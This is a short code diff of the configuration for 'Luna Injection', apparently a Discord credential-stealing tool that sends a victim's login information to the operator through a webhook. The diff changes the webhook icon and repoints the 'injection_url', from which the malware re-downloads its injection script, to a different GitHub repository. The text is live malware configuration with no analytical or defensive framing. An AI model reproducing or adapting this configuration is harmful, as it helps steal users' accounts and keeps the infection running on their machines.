@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Luna Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.discordapp.com/attachments/1040266161528508468/1094173424483577886/Rotating_earth_large.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Py0x11/Py0x11.github.io/main/inj.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
